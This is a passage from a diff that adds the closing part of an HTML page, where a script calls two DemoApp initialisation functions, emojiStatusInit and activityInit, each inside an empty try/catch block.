+        DemoApp.emojiStatusInit();
+    } catch(e) {}
+    try {
+        DemoApp.activityInit();
+    } catch(e) {}
+</script>
+
+</body>
 </html>
